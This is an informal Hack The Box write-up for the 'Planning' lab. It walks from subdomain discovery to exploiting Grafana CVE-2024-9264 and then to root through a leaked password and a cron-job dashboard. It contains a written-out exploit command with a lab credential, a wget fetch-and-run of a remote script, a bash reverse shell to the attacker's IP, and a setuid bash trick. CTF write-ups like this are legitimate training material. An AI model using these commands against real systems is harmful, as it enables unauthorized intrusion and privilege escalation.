In this writeup we will talk about planning lab which is an easy lab in Hack the box

[planning](/images/planning.png)

# nmap

![nmap](images/nmap.png)

with this nmap scan we can see http is open but when you go to the host it says planning.htb so you need to add planning.htb in /etc/hosts file

# enumeration

after going to planning.htb you will notice its just a courses website. but here comes the subdomain enumeration

using ffuf or any subdomain enumeration you will notice theres a grafana.planning.htb

then you will use the provided credentials and you will notice the version of grafana is 11.0.0 which is vulnerable to **CVE-2024-9264**

# **CVE-2024-9264**

this cve is RCE n grafana because of duckdb sqli

git clone it then you will need to make a reverse shell to gain shell

`python3 [CVE-2024-9264.py](http://cve-2024-9264.py/) -u admin -p 0D5oT70Fq13EvB5r -c "wget http://10.10.16.99:8000/rev.sh -O /tmp/rev.sh && chmod +x /tmp/rev.sh && /tmp/rev.sh" [http://grafana.planning.htb](http://grafana.planning.htb/)`

the [rev.sh](http://rev.sh) ⇒

`#!/bin/bash
bash -i >& /dev/tcp/10.10.16.99/9090 0>&1`

then you will gain access.

# privilege escalation

when you gain access you will notice you can type **env** comand

env ⇒ command that displays the environment variables

then you will notice the password of user **enzo** is displayed.

gain access as enzo so you can unlock more approaches

# Enzo

as enzo go for privilege escalation approaches is searchng for cronjobs. so you will notice the crontab.db inside /opt

display it and you will figure out that theres a dashboard for the cronjobs running somewhere

with running `netstat -tupln` you will notice theres something running in port 8000

with **port forwarding** technique you can display that service in your localhost

`ssh -L 8000:127.0.0.1:8000 enzo@planning.htb`

go to 127.0.0.1:8000 and then type the password you gained from the cronjobs db

we now have the cronjobs and can set a new one

set a new one that copies the bash binary into the tmp directory

![cronjobs](images/cron.png)
from enzo run ./bash -p in the tmp folder and now we are root
